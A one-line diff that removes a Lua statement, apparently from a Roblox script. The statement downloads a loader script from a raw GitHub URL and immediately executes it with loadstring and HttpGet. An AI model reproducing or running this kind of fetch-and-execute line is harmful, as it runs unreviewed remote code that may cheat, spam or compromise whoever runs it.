@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/scrooms-undergarden-spam1-kyjq8o3bo6hqls.lua"))()
